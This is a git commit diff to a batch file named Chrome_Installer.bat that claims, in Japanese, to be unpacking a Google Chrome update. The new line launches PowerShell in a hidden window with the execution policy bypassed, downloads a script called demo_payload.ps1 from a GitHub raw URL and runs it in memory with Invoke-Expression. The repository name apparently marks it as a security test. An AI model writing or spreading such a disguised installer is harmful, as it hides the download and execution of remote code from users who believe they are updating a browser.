d64d7fd665a3c1ff4d832da50de896805c461f80
TakahashiTakumi0331 <51337891+TakahashiTakumi0331@users.noreply.github.com>
2026-07-19 22:13:42 +0900

    Update Chrome_Installer.bat

--- Chrome_Installer.bat
+++ Chrome_Installer.bat
@@ -1,6 +1,6 @@
 @echo off
 :: Chrome_Installer.bat
 echo Google Chromeの更新ファイルを展開中...
-:: PowerShellを隠しウィンドウで実行し、カレントフォルダのps1を呼び出す
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "demo_payload.ps1"
+:: GitHubから直接スクリプトを読み込み、メモリ上で実行する
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TakahashiTakumi0331/sec_test_installer/refs/heads/main/demo_payload.ps1')"
 exit
